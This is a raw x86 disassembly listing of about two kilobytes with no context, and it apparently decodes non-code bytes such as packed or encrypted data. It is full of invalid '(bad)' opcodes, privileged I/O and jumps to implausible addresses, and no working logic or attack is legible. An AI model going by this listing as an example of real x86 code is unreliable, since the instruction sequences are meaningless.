  4166d0:	addr16 mov eax,ds:0xa063
  4166d4:	fwait
  4166d5:	adc    DWORD PTR [esi-0x29b4dbc3],0xdd6b069c
  4166df:	adc    edi,DWORD PTR [ebp+0x2fe6b1ab]
  4166e5:	push   ebp
  4166e6:	xor    BYTE PTR [ebx+0x15],cl
  4166e9:	ins    DWORD PTR es:[edi],dx
  4166ea:	cld    
  4166eb:	scas   al,BYTE PTR es:[edi]
  4166ec:	ins    BYTE PTR es:[edi],dx
  4166ed:	(bad)  
  4166ee:	cmc    
  4166ef:	ins    BYTE PTR es:[edi],dx
  4166f0:	inc    ebx
  4166f1:	ins    BYTE PTR es:[edi],dx
  4166f2:	sbb    eax,0xf111a70f
  4166f7:	fs ins DWORD PTR es:[edi],dx
  4166f9:	mov    al,ds:0xfb67a95c
  4166fe:	jae    0x4166ba
  416700:	dec    edx
  416701:	call   0x893:0x2048052f
  416708:	les    esi,FWORD PTR [edi+0x3e744e43]
  41670e:	arpl   bx,ax
  416710:	ins    BYTE PTR es:[edi],dx
  416711:	clc    
  416712:	mov    eax,ds:0xcd62b550
  416717:	jns    0x416788
  416719:	mov    edi,DWORD PTR ds:[edi+0x46fb0f8]
  416720:	xchg   esi,eax
  416721:	mov    BYTE PTR [esi],dh
  416723:	icebp  
  416724:	mov    al,0x10
  416726:	adc    DWORD PTR [ebp-0x75888ee],esi
  41672c:	icebp  
  41672d:	pop    ebx
  41672e:	mov    BYTE PTR [ecx+0x34],0x33
  416732:	adc    esi,DWORD PTR [esp+eiz*4+0x3b]
  416736:	or     eax,0x7e789522
  41673b:	outs   dx,BYTE PTR ds:[esi]
  41673c:	inc    eax
  41673d:	sub    BYTE PTR [edx+0x42],bh
  416740:	inc    edx
  416741:	(bad)  
  416742:	call   0xb9e14a52
  416747:	pop    ebp
  416748:	clc    
  416749:	push   esp
  41674a:	mov    eax,ds:0x8380f4d0
  41674f:	imul   esp,esi,0x47
  416752:	ins    DWORD PTR es:[edi],dx
  416753:	or     DWORD PTR [edx+0x7a],0xecf77043
  41675a:	fnstsw WORD PTR [esi+0x79a7d4c3]
  416760:	outs   dx,BYTE PTR ds:[esi]
  416761:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416762:	sbb    BYTE PTR [esi-0x4],dl
  416765:	lock inc eax
  416767:	jmp    0x1bbb5786
  41676c:	cmp    al,BYTE PTR fs:[esi-0x5e]
  416770:	sahf   
  416771:	mov    cs,WORD PTR [eax]
  416773:	mov    eax,ds:0x7e573a3b
  416778:	neg    ah
  41677a:	pop    esp
  41677b:	das    
  41677c:	into   
  41677d:	test   DWORD PTR [edi-0x2917a849],eax
  416783:	scas   al,BYTE PTR es:[edi]
  416784:	test   eax,0x414cabf3
  416789:	push   edx
  41678a:	xchg   BYTE PTR [ebx],dl
  41678c:	mov    dl,0xf9
  41678e:	jle    0x41671c
  416790:	arpl   WORD PTR [edi],si
  416792:	sbb    BYTE PTR [edx-0x45],bl
  416795:	jno    0x4167f6
  416797:	and    eax,DWORD PTR [eax+esi*4]
  41679a:	mov    ch,0xf9
  41679c:	es nop
  41679e:	imul   ebx,DWORD PTR [esi+ebx*2-0x2d8a23be],0x33dbcf75
  4167a9:	shr    BYTE PTR [ecx-0x44],cl
  4167ac:	call   0x24b188ec
  4167b1:	scas   al,BYTE PTR es:[edi]
  4167b2:	sub    al,0xf3
  4167b4:	data16 sub bl,bl
  4167b7:	adc    DWORD PTR [ebx+0x36c113c],ebp
  4167bd:	sbb    BYTE PTR [esi+0x18c94321],bl
  4167c3:	mov    edx,0xb2ffd22b
  4167c8:	cwde   
  4167c9:	sub    bh,BYTE PTR [ebx-0x40]
  4167cc:	and    dh,BYTE PTR [eax]
  4167ce:	cmp    DWORD PTR [ebp-0x454ee41c],ebx
  4167d4:	xor    ch,BYTE PTR [esi]
  4167d6:	shl    BYTE PTR [edx+0x55],0xb4
  4167da:	enter  0x54a5,0xda
  4167de:	xchg   esp,eax
  4167df:	jmp    FWORD PTR [bx+0x4fea]
  4167e4:	sbb    edi,ebx
  4167e6:	aaa    
  4167e7:	pop    esi
  4167e8:	or     al,0x1c
  4167ea:	mov    ?,eax
  4167ec:	ins    BYTE PTR es:[edi],dx
  4167ed:	arpl   WORD PTR [ecx+0x4f85f203],dx
  4167f3:	dec    eax
  4167f4:	mov    ebx,0x222c48f6
  4167f9:	aam    0x9d
  4167fb:	inc    esi
  4167fc:	dec    ebp
  4167fd:	retf   
  4167fe:	xor    BYTE PTR [ebx],0x7b
  416801:	in     al,dx
  416802:	mov    dh,0x7
  416804:	push   cs
  416805:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416806:	inc    esp
  416807:	mov    BYTE PTR [edx],al
  416809:	jl     0x416830
  41680b:	(bad)  
  41680d:	ror    DWORD PTR [edi-0x5aca2f0e],0xb6
  416814:	js     0x41686f
  416816:	test   DWORD PTR [ecx+0x69e841d],ebp
  41681c:	ss jmp 0x59c2:0x72ded071
  416824:	xor    bh,BYTE PTR [eax+0x2cc42695]
  41682a:	es std 
  41682c:	jmp    0x791f:0xca54dade
  416833:	into   
  416834:	nop
  416835:	idiv   BYTE PTR [esi]
  416837:	je     0x416849
  416839:	inc    esi
  41683a:	xchg   ebx,eax
  41683b:	sub    eax,0xc1437ef6
  416840:	lahf   
  416841:	add    cl,BYTE PTR [esi-0x78]
  416844:	les    edx,FWORD PTR [esi]
  416846:	cdq    
  416847:	cli    
  416848:	cmp    DWORD PTR [edx],edi
  41684a:	and    al,0x11
  41684c:	and    DWORD PTR [edx],edx
  41684e:	dec    ebp
  41684f:	addr16 xchg ebx,eax
  416851:	les    ebx,FWORD PTR [ebp+0x78]
  416854:	(bad)  
  416856:	dec    esi
  416857:	retf   
  416858:	cmp    BYTE PTR [ebx+0x68],bl
  41685b:	out    dx,al
  41685c:	jmp    0x41683a
  41685e:	mov    eax,ds:0x922cf5cc
  416863:	(bad)  
  416864:	dec    esp
  416865:	fcmovnbe st,st(3)
  416867:	mov    bh,0x9
  416869:	mov    cs,WORD PTR [ebx+0x556e022b]
  41686f:	xchg   DWORD PTR [edx],edi
  416871:	sahf   
  416872:	sbb    ah,cl
  416874:	mov    ecx,0x7227941a
  416879:	add    eax,0xe9df49c5
  41687e:	scas   al,BYTE PTR es:[edi]
  41687f:	std    
  416880:	mov    ebx,gs
  416882:	pop    eax
  416883:	test   BYTE PTR ds:0xdcb7d30c,dh
  416889:	addr16 (bad) 
  41688b:	in     eax,dx
  41688c:	cmc    
  41688d:	icebp  
  41688e:	sbb    al,0xdf
  416890:	jne    0x416833
  416892:	xchg   DWORD PTR [eax+eax*4-0x2025fa41],eax
  416899:	scas   al,BYTE PTR es:[edi]
  41689a:	xchg   edx,eax
  41689b:	cmp    ch,BYTE PTR [edi]
  41689d:	cli    
  41689e:	ficom  WORD PTR [esi+0x43203036]
  4168a4:	icebp  
  4168a5:	shl    BYTE PTR [ecx],cl
  4168a7:	adc    BYTE PTR [esi],cl
  4168a9:	push   eax
  4168aa:	add    eax,0xf071291c
  4168af:	sub    BYTE PTR [ebx+0x29f14478],dl
  4168b5:	push   es
  4168b6:	jne    0x416916
  4168b8:	xor    ah,0x48
  4168bb:	arpl   WORD PTR [ebp-0x609cb916],bp
  4168c1:	idiv   BYTE PTR [ecx+edx*8-0x2d5ae34b]
  4168c8:	mov    DWORD PTR [esi-0x76ac13c2],0xeb2be563
  4168d2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4168d3:	and    al,0x28
  4168d5:	lock or al,cl
  4168d8:	lods   eax,DWORD PTR ds:[esi]
  4168d9:	or     eax,0x556cc88a
  4168de:	xor    dl,BYTE PTR [ebp-0x3c]
  4168e1:	sub    ebx,DWORD PTR [edi+0x3]
  4168e4:	hlt    
  4168e5:	sbb    ebx,DWORD PTR [eax]
  4168e7:	loope  0x416907
  4168e9:	pop    es
  4168ea:	xchg   ebp,eax
  4168eb:	leave  
  4168ec:	mov    cl,0xf
  4168ee:	fild   DWORD PTR [esp+esi*2+0x46]
  4168f2:	mov    bl,0xc
  4168f4:	add    bh,dl
  4168f6:	sbb    al,0x28
  4168f8:	fcmovb st,st(2)
  4168fa:	push   ebp
  4168fb:	popa   
  4168fc:	mov    WORD PTR [edi+0x2a],ds
  4168ff:	popa   
  416900:	retf   
  416901:	pop    edi
  416902:	out    dx,al
  416903:	sub    BYTE PTR [ebp-0x4b],ch
  416906:	sti    
  416907:	pusha  
  416908:	dec    ecx
  416909:	mov    ebp,0xc43f2447
  41690e:	push   ss
  41690f:	mov    esi,?
  416911:	pop    es
  416912:	int    0x60
  416914:	lahf   
  416915:	push   ebp
  416916:	in     al,dx
  416917:	dec    eax
  416918:	lods   eax,DWORD PTR ds:[esi]
  416919:	daa    
  41691a:	or     bl,BYTE PTR [ebx+edi*4+0x3e35d731]
  416921:	mov    ds,WORD PTR [ebp-0x2aa7fd20]
  416927:	push   ds
  416928:	fld    st(5)
  41692a:	lahf   
  41692b:	adc    ecx,DWORD PTR [esi-0x78]
  41692e:	frstor [ebp+eax*8+0x69]
  416932:	inc    esi
  416933:	adc    al,0x99
  416935:	mov    dl,0x40
  416937:	mov    eax,0x1bacd5f8
  41693c:	push   esp
  41693d:	pop    edx
  41693e:	jb     0x4168eb
  416940:	sahf   
  416941:	cmp    eax,0x11d1eea
  416946:	dec    eax
  416947:	adc    DWORD PTR [eax+0x5feccddd],ebx
  41694d:	pop    eax
  41694e:	sbb    BYTE PTR [ebp+0x7b],ch
  416951:	xchg   esi,eax
  416952:	rcl    DWORD PTR [edx],0xc7
  416955:	or     esi,DWORD PTR ds:0x82a20d20
  41695b:	jmp    0xfd2599ea
  416960:	fcomp  QWORD PTR [ebx-0x417d648a]
  416966:	fbld   TBYTE PTR cs:[edi]
  416969:	and    bl,cl
  41696b:	cmp    eax,0xdfab89d
  416970:	inc    edi
  416971:	xchg   ebx,eax
  416972:	lods   eax,DWORD PTR ds:[esi]
  416973:	inc    esp
  416974:	fs sahf 
  416976:	adc    BYTE PTR [ecx-0x3f],ch
  416979:	call   0xb36e:0xe37353a7
  416980:	lds    eax,FWORD PTR [eax+0x76eeaa5a]
  416986:	cdq    
  416987:	pusha  
  416988:	mov    esi,es
  41698a:	mov    ecx,0x463882bc
  41698f:	and    DWORD PTR [eax],eax
  416991:	test   DWORD PTR [ebx],0xa1f9eb53
  416997:	int3   
  416998:	sar    DWORD PTR [ebp-0x79],cl
  41699b:	dec    esi
  41699c:	inc    ebx
  41699d:	je     0x416a12
  41699f:	lea    eax,[ebx+0x806e922]
  4169a5:	icebp  
  4169a6:	dec    ebx
  4169a7:	shl    BYTE PTR [eax-0x2f6b2162],1
  4169ad:	pushf  
  4169ae:	cmp    dh,BYTE PTR [edi-0x17510636]
  4169b4:	push   0x7d
  4169b6:	add    BYTE PTR [ebx],cl
  4169b8:	pushf  
  4169b9:	add    ebx,DWORD PTR [edi+0x742bebdf]
  4169bf:	jp     0x416a40
  4169c1:	add    eax,0x1c1420ed
  4169c6:	(bad)  
  4169c7:	sub    eax,0xcc51c7c8
  4169cc:	add    ecx,esp
  4169ce:	mov    al,ds:0x6c60d593
  4169d3:	out    dx,al
  4169d4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4169d5:	(bad)  
  4169d6:	stos   DWORD PTR es:[edi],eax
  4169d7:	pop    esi
  4169d8:	sub    DWORD PTR [ebp+0x5907905e],eax
  4169de:	push   0x7e
  4169e0:	mov    bp,0xf338
  4169e4:	xlat   BYTE PTR ds:[ebx]
  4169e5:	dec    ecx
  4169e6:	cmp    BYTE PTR [eax-0x2be4bd36],bl
  4169ec:	mov    dh,0x2c
  4169ee:	dec    edx
  4169ef:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4169f0:	cmp    esp,DWORD PTR [eax]
  4169f2:	(bad)  
  4169f3:	push   ss
  4169f4:	mov    ebp,0x3360a32b
  4169f9:	mov    ah,0xd9
  4169fb:	inc    esp
  4169fc:	adc    eax,0xe375b471
  416a01:	mov    esp,0x1ddbb8f4
  416a06:	inc    ebp
  416a07:	repnz mov DWORD PTR [edi+ebp*4],ecx
  416a0b:	sbb    ecx,DWORD PTR [edx+0x21]
  416a0e:	mov    cx,0x3e3d
  416a12:	aad    0x9f
  416a14:	sbb    BYTE PTR [esi-0x240ccefc],al
  416a1a:	ret    
  416a1b:	iret   
  416a1c:	jno    0x4169b1
  416a1e:	enter  0x9837,0xd4
  416a22:	out    dx,eax
  416a23:	push   0x51382198
  416a28:	jmp    0x416a46
  416a2a:	mov    edi,0xb28f3743
  416a2f:	cmp    ah,bh
  416a31:	mov    esi,0xc7b3cb1d
  416a36:	clc    
  416a37:	adc    ah,ch
  416a39:	add    DWORD PTR [esi+0x7a9ad208],ecx
  416a3f:	sub    cl,BYTE PTR [ebp+0x5d]
  416a42:	inc    ebx
  416a43:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416a44:	sbb    eax,0x5f05974d
  416a49:	not    DWORD PTR [edx]
  416a4b:	(bad)  
  416a4c:	call   0x602d414f
  416a51:	xchg   esp,eax
  416a52:	fiadd  WORD PTR [ebx]
  416a54:	mov    gs,WORD PTR [esi]
  416a56:	push   eax
  416a57:	aad    0xdf
  416a59:	jns    0x416a39
  416a5b:	mov    WORD PTR [eax-0x2568816c],cs
  416a61:	test   eax,0x4d103d3d
  416a66:	add    eax,0x665c7ec6
  416a6b:	lds    eax,FWORD PTR [ecx-0x60]
  416a6e:	push   esp
  416a6f:	dec    edi
  416a70:	mov    esi,0xe4852722
  416a75:	repnz mov esi,0xd691c77e
  416a7b:	sub    dh,BYTE PTR [edi]
  416a7d:	lahf   
  416a7e:	jnp    0x416a95
  416a80:	cld    
  416a81:	pop    ss
  416a82:	test   BYTE PTR [ebx+eax*2+0x54036361],dh
  416a89:	adc    BYTE PTR [ebp-0x1b54813a],dl
  416a8f:	xchg   ecx,eax
  416a90:	and    al,0xa8
  416a93:	jp     0x416a36
  416a95:	ja     0x416b13
  416a97:	sub    eax,0x208b8790
  416a9c:	cmp    dh,BYTE PTR [eax]
  416a9e:	xor    BYTE PTR [ebx-0x2deab859],al
  416aa4:	int3   
  416aa5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416aa6:	cld    
  416aa7:	xor    al,BYTE PTR es:[ebx]
  416aaa:	out    0x8,eax
  416aac:	fldenv es:[edx+0x74439503]
  416ab3:	jns    0x416ae6
  416ab5:	mov    ?,ecx
  416ab7:	cmp    ebp,eax
  416ab9:	fimul  DWORD PTR [edx]
  416abb:	lahf   
  416abc:	pop    ss
  416abd:	stc    
  416abe:	iret   
  416abf:	enter  0xb4bb,0xd9
  416ac3:	pushf  
  416ac4:	mov    es,WORD PTR [esi-0x3b7d9363]
  416aca:	inc    ebp
  416acb:	into   
  416acc:	stos   BYTE PTR es:[edi],al
  416acd:	lods   al,BYTE PTR ds:[esi]
  416ace:	(bad)  
  416acf:	enter  0x1467,0x86
  416ad3:	data16 js 0x416ab6
  416ad6:	xchg   ecx,eax
  416ad7:	popa   
  416ad8:	cmp    esi,esp
  416ada:	stc    
  416adb:	das    
  416adc:	pop    ss
  416add:	pusha  
  416ade:	sbb    esp,DWORD PTR [eax-0x457e4b8]
  416ae4:	jg     0x416afd
  416ae6:	ficom  DWORD PTR [esi+edi*2-0x2b0ec949]
  416aed:	lock mov edx,0x3fa19e0a
  416af3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416af4:	push   cs
  416af5:	push   ecx
  416af6:	mov    ebp,0x3c239e1
  416afb:	sahf   
  416afc:	int3   
  416afd:	leave  
  416afe:	jmp    0x1102341
  416b03:	sub    bh,BYTE PTR [esi]
  416b05:	inc    eax
  416b06:	push   eax
  416b07:	xor    ah,dh
  416b09:	cld    
  416b0a:	mov    ds:0x1562244b,al
  416b0f:	and    cl,ch
  416b11:	add    eax,0x87822272
  416b16:	sahf   
  416b17:	push   es
  416b18:	or     bh,BYTE PTR [ebx-0x80]
  416b1b:	sbb    BYTE PTR [ecx-0x5c],al
  416b1e:	dec    edi
  416b1f:	lahf   
  416b20:	lock sbb ebx,DWORD PTR [ebx+0x5e6d703f]
  416b27:	sahf   
  416b28:	ret    
  416b29:	and    ebp,edx
  416b2b:	int3   
  416b2c:	scas   eax,DWORD PTR es:[edi]
  416b2d:	push   ebx
  416b2e:	lods   al,BYTE PTR ds:[esi]
  416b2f:	inc    ebx
  416b30:	pop    ss
  416b31:	xchg   edx,eax
  416b32:	in     al,0x8f
  416b34:	pop    eax
  416b35:	les    esi,FWORD PTR [eax-0x2a]
  416b38:	cmp    eax,0xc513aaed
  416b3d:	mov    edx,0x176140c0
  416b42:	lea    edx,[esp+ebx*8+0x56500932]
  416b49:	popf   
  416b4a:	and    al,0xf2
  416b4c:	sbb    DWORD PTR [edx+ecx*2],0x8d80cb2c
  416b53:	add    DWORD PTR [esi+0x40],esi
  416b56:	int    0x9
  416b58:	test   BYTE PTR [ebx+0x72bd119f],bh
  416b5e:	scas   eax,DWORD PTR es:[edi]
  416b5f:	sahf   
  416b60:	int    0xa5
  416b62:	jns    0x416bdf
  416b64:	and    ebp,esi
  416b66:	loop   0x416b89
  416b68:	sbb    edx,DWORD PTR [edx-0x24]
  416b6b:	in     al,0x45
  416b6d:	sub    DWORD PTR [edx-0x4d60f704],edi
  416b73:	sbb    al,0xa0
  416b75:	mov    DWORD PTR [ebx-0x21c8a5f5],esi
  416b7b:	loop   0x416b1c
  416b7d:	dec    ecx
  416b7e:	int    0x44
  416b80:	xor    al,0xa5
  416b82:	sbb    al,0xf3
  416b84:	test   eax,0xbcef64d4
  416b89:	sub    ch,BYTE PTR [edi+0x7522dcaf]
  416b8f:	pusha  
  416b90:	cli    
  416b91:	xor    al,0xf9
  416b93:	sbb    BYTE PTR [ebp+0x2d660981],0xab
  416b9a:	mov    eax,ds:0x5f4c6921
  416b9f:	jne    0x416b52
  416ba1:	mov    ebp,esp
  416ba3:	xchg   DWORD PTR [eax],edx
  416ba5:	mov    esp,ebx
  416ba7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416ba8:	div    ah
  416baa:	and    eax,0x39e1725e
  416baf:	repnz push 0xffffffa2
  416bb2:	sub    DWORD PTR [ecx+0x33],ebx
  416bb5:	loopne 0x416c0e
  416bb7:	mul    BYTE PTR [ecx+0x5490bcc5]
  416bbd:	mov    bh,0x9b
  416bbf:	jle    0x416bbd
  416bc1:	js     0x416b90
  416bc3:	ror    BYTE PTR [edi-0x20162448],0x39
  416bca:	js     0x416b90
  416bcc:	push   eax
  416bcd:	rcr    eax,1
  416bcf:	int3   
  416bd0:	or     esi,edi
  416bd2:	div    DWORD PTR [eax-0x5e]
  416bd5:	pop    ds
  416bd6:	ins    BYTE PTR es:[edi],dx
  416bd7:	fbstp  TBYTE PTR [esi+0x5c2db77e]
  416bdd:	jno    0x416c16
  416bdf:	out    dx,al
  416be0:	loop   0x416b7f
  416be2:	hlt    
  416be3:	ret    
  416be4:	push   edx
  416be5:	sbb    al,bh
  416be7:	ror    dl,1
  416be9:	cmp    BYTE PTR [edi],0x79
  416bec:	sub    DWORD PTR [esi-0x43],ebx
  416bef:	or     DWORD PTR [esi-0x644491d7],edx
  416bf5:	fisubr DWORD PTR [ecx-0x64750304]
  416bfb:	test   cl,ch
  416bfd:	sahf   
  416bfe:	add    ah,ah
  416c00:	push   ds
  416c01:	inc    edi
  416c02:	xor    ah,BYTE PTR [eax-0x20496185]
  416c08:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416c09:	rcr    dh,0x56
  416c0c:	popf   
  416c0d:	fbstp  TBYTE PTR [edi]
  416c0f:	(bad)  
  416c11:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416c12:	call   0x6b3f:0x170eb69c
  416c19:	scas   al,BYTE PTR es:[edi]
  416c1a:	mov    ds:0xbf187ae6,eax
  416c1f:	mov    ebp,0x173429f4
  416c24:	ss enter 0x2e78,0xe2
  416c29:	mov    bh,0x46
  416c2b:	adc    edx,DWORD PTR ds:0xa88b20e
  416c31:	iret   
  416c32:	pop    ebp
  416c33:	xor    eax,0x7a083d7c
  416c38:	push   0x3c005df4
  416c3d:	out    dx,al
  416c3e:	or     al,0xcc
  416c40:	pop    ss
  416c41:	movs   DWORD PTR es:[edi],DWORD PTR es:[esi]
  416c43:	sar    BYTE PTR [edx+0x4bc6e597],0x17
  416c4a:	inc    edi
  416c4b:	and    cl,BYTE PTR [esi]
  416c4d:	xor    ecx,edi
  416c4f:	scas   eax,DWORD PTR es:[edi]
  416c50:	jne    0x416cb2
  416c52:	(bad)  
  416c54:	stos   BYTE PTR es:[edi],al
  416c55:	daa    
  416c56:	or     eax,0xec2470e4
  416c5b:	mov    al,0x85
  416c5d:	jmp    0x6fd4c1ff
  416c62:	pop    ebp
  416c63:	mov    ah,0xc0
  416c65:	retf   0x4d59
  416c68:	jbe    0x416c3e
  416c6a:	jmp    0x416c8c
  416c6c:	je     0x416ced
  416c6e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416c6f:	jns    0x416c8c
  416c71:	rcr    DWORD PTR [ebx-0x2e17bc4b],1
  416c77:	push   edi
  416c78:	sub    BYTE PTR [esp+esi*2],0x91
  416c7c:	sbb    DWORD PTR [edx-0x727cb0e0],edi
  416c82:	xchg   DWORD PTR [esp+ebp*4+0x67797a2f],esp
  416c89:	sbb    dl,dh
  416c8b:	cmp    eax,0x94606603
  416c90:	and    ch,dl
  416c92:	cs mov ch,0xa1
  416c95:	jo     0x416c4c
  416c97:	(bad)  
  416c98:	mov    ds:0x56275195,eax
  416c9d:	ins    BYTE PTR es:[edi],dx
  416c9e:	pop    ss
  416c9f:	iret   
  416ca0:	inc    esp
  416ca1:	imul   esp,DWORD PTR [eax-0x10da07ee],0x33
  416ca8:	and    DWORD PTR [esi+ecx*8+0x4f],eax
  416cac:	push   esp
  416cad:	loope  0x416c91
  416caf:	inc    edx
  416cb0:	ins    BYTE PTR es:[edi],dx
  416cb1:	cwde   
  416cb2:	dec    esi
  416cb3:	inc    ebx
  416cb4:	ins    BYTE PTR es:[edi],dx
  416cb5:	adc    cl,bl
  416cb7:	jno    0x416cb0
  416cb9:	daa    
  416cba:	dec    edx
  416cbb:	int3   
  416cbc:	mov    dl,0xec
  416cbe:	jb     0x416c6c
  416cc0:	push   0x4d93c47d
  416cc5:	js     0x416c61
  416cc7:	cmp    DWORD PTR [edx+0x7e],0xffffffdc
  416ccb:	out    dx,al
  416ccc:	inc    ecx
  416ccd:	or     eax,0x6d984306
  416cd2:	sub    dh,BYTE PTR [eax+0x7089fd18]
  416cd8:	adc    eax,0x697cb586
  416cdd:	out    dx,al
  416cde:	dec    DWORD PTR [ebp+ecx*2+0x46eabe57]
  416ce5:	rol    DWORD PTR [edx],cl
  416ce7:	jns    0x416c6e
  416ce9:	loop   0x416cb0
  416ceb:	cld    
  416cec:	xor    eax,0xa1443b
  416cf1:	je     0x416d52
  416cf3:	dec    eax
  416cf4:	(bad)  
  416cf5:	int3   
  416cf6:	cmp    esp,DWORD PTR [ebx]
  416cf8:	pop    edx
  416cf9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416cfa:	xor    ah,BYTE PTR [edi]
  416cfc:	pop    ecx
  416cfd:	sbb    BYTE PTR [ebx+0xd892099],bh
  416d03:	pop    ds
  416d04:	scas   al,BYTE PTR es:[edi]
  416d05:	mov    edi,0xec89f439
  416d0a:	popf   
  416d0b:	sbb    ebx,DWORD PTR [esi]
  416d0d:	pop    ds
  416d0e:	aad    0x61
  416d10:	inc    ecx
  416d11:	pushf  
  416d12:	test   DWORD PTR [eax+edi*1+0x1282f287],edx
  416d19:	or     ebx,DWORD PTR [ebp+0x47]
  416d1c:	jno    0x416d02
  416d1e:	cld    
  416d1f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416d20:	imul   esp,esp,0x786f69f6
  416d26:	in     al,dx
  416d27:	fistp  DWORD PTR [ecx]
  416d29:	jo     0x416d31
  416d2b:	lock inc edx
  416d2d:	sbb    DWORD PTR [esi+0x1e1df892],eax
  416d33:	loop   0x416cfd
  416d35:	cmp    ebx,DWORD PTR [ecx+ebx*2-0x545fd4fd]
  416d3c:	jmp    0xdf622203
  416d41:	xchg   ebx,eax
  416d42:	lahf   
  416d43:	sti    
  416d44:	jl     0x416d0b
  416d46:	cwde   
  416d47:	sbb    DWORD PTR [edi+0xa4f2f7e],edx
  416d4d:	jmp    0x416d13
  416d4f:	mov    BYTE PTR [ecx-0x246628cb],bl
  416d55:	cmp    bl,ah
  416d57:	rcl    DWORD PTR [ebp-0x5d],0x6
  416d5b:	jp     0x416d2f
  416d5d:	es sub al,0x3d
  416d60:	jb     0x416d98
  416d62:	adc    al,0xfe
  416d64:	dec    esi
  416d65:	mov    esp,0xaf9ea069
  416d6a:	or     ecx,edx
  416d6c:	push   esp
  416d6d:	mov    edx,0x1e5800a4
  416d72:	hlt    
  416d73:	cwde   
  416d74:	fsub   DWORD PTR [edx]
  416d76:	dec    eax
  416d77:	retf   
  416d78:	push   esp
  416d79:	out    dx,eax
  416d7a:	mov    bl,0x97
  416d7c:	and    dh,BYTE PTR [edx+ebx*1-0x5d]
  416d80:	mov    ds:0xf1a4e64f,al
  416d85:	out    dx,al
  416d86:	es xchg ebp,eax
  416d88:	xchg   esp,eax
  416d89:	mov    al,ds:0xe7a78943
  416d8e:	cwde   
  416d8f:	test   eax,0xa268b1eb
  416d94:	test   eax,0xb12d56e
  416d99:	sti    
  416d9a:	cmc    
  416d9b:	sti    
  416d9c:	aaa    
  416d9d:	sbb    al,0x22
  416d9f:	lock push eax
  416da1:	push   eax
  416da2:	lods   al,BYTE PTR ds:[esi]
  416da3:	inc    edi
  416da4:	xor    BYTE PTR [eax],dh
  416da6:	into   
  416da7:	inc    eax
  416da8:	cmp    DWORD PTR [ecx-0x3194041c],ebp
  416dae:	fidiv  WORD PTR [edx+0x32e39903]
  416db4:	sub    BYTE PTR [ebx+0x3f0a8ec1],0xaf
  416dbb:	cmp    ebx,0xc23201fe
  416dc1:	popf   
  416dc2:	loopne 0x416de8
  416dc4:	sbb    ecx,DWORD PTR [edi+0x72ba8e04]
  416dca:	pusha  
  416dcb:	out    0x4,al
  416dcd:	push   ecx
  416dce:	es pushf 
  416dd0:	cwde   
  416dd1:	fistp  DWORD PTR [esi+0x4af4deb0]
  416dd7:	hlt    
  416dd8:	push   0x2f
  416dda:	xor    al,BYTE PTR [esi-0x784c3753]
  416de0:	jbe    0x416d95
  416de2:	push   ds
  416de3:	dec    esi
  416de4:	leave  
  416de5:	mov    edi,0xf3a26ad2
  416dea:	mov    eax,0xbe6e5c83
  416def:	mov    edx,0xe245d1f1
  416df4:	lods   al,BYTE PTR ds:[esi]
  416df5:	sbb    bl,bh
  416df7:	inc    ebp
  416df8:	out    dx,al
  416df9:	or     eax,0xc5f8b69e
  416dfe:	sbb    DWORD PTR [ebx-0xfa2f3a9],eax
  416e04:	xor    DWORD PTR [eax-0x11a26f47],ebx
  416e0a:	push   0xafbf35d8
  416e0f:	jbe    0x416e0f
  416e11:	cmp    eax,DWORD PTR [eax]
  416e13:	(bad)  
  416e14:	mov    bl,0xe7
  416e16:	sub    BYTE PTR [edx],bh
  416e18:	inc    edx
  416e19:	xor    ch,BYTE PTR [esi-0x778264ff]
  416e1f:	add    bh,BYTE PTR [eax]
  416e21:	add    eax,0x2c5a4f29
  416e26:	pop    esi
  416e27:	mov    ecx,DWORD PTR [ecx+0x5bc34c09]
  416e2d:	lods   eax,DWORD PTR ds:[esi]
  416e2e:	or     al,0xf1
  416e30:	mov    BYTE PTR [ebx+edi*8-0x2e],al
  416e34:	add    DWORD PTR [edx-0x9],ebp
  416e37:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416e38:	add    ch,bl
  416e3a:	mov    esi,0x18ecf82b
  416e3f:	packsswb mm6,QWORD PTR [ecx-0x25]
  416e43:	loopne 0x416e9a
  416e45:	push   edx
  416e46:	sub    ch,dh
  416e48:	shl    dl,1
  416e4a:	jbe    0x416e22
  416e4c:	or     ebx,esi
  416e4e:	shr    DWORD PTR [ecx+0x601deb35],0xee
  416e55:	add    bl,BYTE PTR [esi]
  416e57:	and    eax,0x9031dd01
  416e5c:	mov    ebx,0x4f5d0ee1
  416e61:	cmp    esi,DWORD PTR [ecx+ebx*2-0x5a]
  416e65:	int    0x4d
  416e67:	scas   al,BYTE PTR es:[edi]
  416e68:	mov    ecx,0xd58a308b
  416e6d:	xor    al,0x34
  416e6f:	ret    
  416e70:	addr16 mov edx,0x90986cfc
  416e76:	outs   dx,BYTE PTR ds:[esi]
  416e77:	xlat   BYTE PTR ds:[ebx]
  416e78:	ror    DWORD PTR [ebx+ebp*2+0x69],1
  416e7c:	mul    BYTE PTR ds:0xcfecdd9f
  416e82:	sbb    ebx,DWORD PTR [ebx-0x61]
  416e85:	inc    ecx
  416e86:	pop    eax
  416e87:	sub    ebx,DWORD PTR [edx-0x4c]
  416e8a:	cli    
  416e8b:	jp     0x416ee5
  416e8d:	dec    eax
  416e8e:	mov    al,0xa2
  416e90:	into   
  416e91:	pop    DWORD PTR [ecx+0x55]
  416e94:	aad    0xe5
  416e96:	out    0xca,al
  416e98:	xor    ah,bh
  416e9a:	or     BYTE PTR [edi+0x333e301d],ah
  416ea0:	test   DWORD PTR [edx],0xb1dad752
  416ea6:	outs   dx,DWORD PTR ds:[esi]
  416ea7:	mov    ah,0x59
  416ea9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416eaa:	gs nop
  416eac:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
